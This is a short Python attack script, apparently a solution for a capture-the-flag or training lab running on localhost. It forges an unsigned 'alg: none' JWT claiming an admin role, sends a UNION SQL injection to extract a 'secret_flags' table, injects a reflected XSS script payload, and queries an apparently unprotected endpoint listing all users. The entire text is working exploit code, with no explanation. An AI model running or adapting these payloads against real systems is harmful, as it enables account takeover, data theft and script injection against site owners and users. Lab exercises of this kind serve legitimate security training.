import base64
import requests

header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode('utf-8').rstrip('=')
payload = base64.urlsafe_b64encode(b'{"role":"admin","username":"student"}').decode('utf-8').rstrip('=')
token = f"{header}.{payload}."

res = requests.get('http://127.0.0.1:5000/api/v2/admin_data', headers={'Authorization': f'Bearer {token}'})
print("Bypass Result:", res.status_code, res.text)

res_sqli = requests.get("http://127.0.0.1:5000/api/search?q=' UNION SELECT id, flag_name, flag_value, dummy FROM secret_flags --")
print("SQLi Result:", res_sqli.status_code, res_sqli.text[:200])

res_xss = requests.get("http://127.0.0.1:5000/search?q=<script>alert('XSS_KING')</script>")
print("XSS Result in output:", "<script>alert('XSS_KING')</script>" in res_xss.text)

res_crypto = requests.get("http://127.0.0.1:5000/api/v1/users/all")
print("CryptoFail:", "CRYPTO_FAIL" in res_crypto.text, res_crypto.text[:100])
